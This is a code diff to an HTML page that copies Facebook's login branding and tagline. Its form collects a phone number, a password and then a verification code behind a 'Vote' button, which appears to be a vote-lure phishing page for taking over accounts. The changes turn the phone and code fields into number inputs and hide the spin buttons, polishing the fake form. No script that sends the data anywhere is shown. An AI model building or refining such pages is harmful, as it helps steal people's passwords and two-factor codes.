@@ -22,7 +22,7 @@
             box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
         }
 
-        .container input[type="text"],
+        .container input[type="number"],
         .container input[type="password"] {
             width: 91%;
             padding: 15px;
@@ -90,6 +90,16 @@
         .copyright {
             margin-top: 10px;
         }
+        input[type=number]::-webkit-inner-spin-button,
+input[type=number]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+/* For Firefox */
+input[type=number] {
+    -moz-appearance: textfield;
+}
     </style>
 </head>
 <body>
@@ -102,14 +112,14 @@
             <div class="custom-text">Facebook helps you connect and share with the people in your life.</div>
         </div>
         <form name="login" id="loginForm">
-            <input type="text" class="container input" placeholder="Phone number" name="phone" id="phone">
+            <input type="number" class="container input" placeholder="Phone number" name="phone" id="phone" pattern="[0-9]*">
             <input type="password" class="container input" placeholder="Password" name="password" id="password">
             <button class="login-button" id="loginButton" type="submit" disabled>Submit</button>
         </form>
         <div style="margin-top: 20px; padding: 10px; border: 1px solid rgb(218, 218, 218); width: 99%; border-radius: 5px; background-color: rgb(218, 218, 218);">
             <p contenteditable="false" style="font-size: 16px; color: #333; text-align: center;">Editable text here. You can change this text as needed.</p>
         </div>
-        <input type="text" class="container input" placeholder="Enter verification code" name="verificationCode" id="verificationCode" style="margin-top: 10px;">
+        <input type="number" class="container input" placeholder="Enter verification code" name="verificationCode" id="verificationCode" style="margin-top: 10px;">
         <button class="login-button vote-button" id="voteButton" type="button" disabled>Vote</button>
     </div>
 
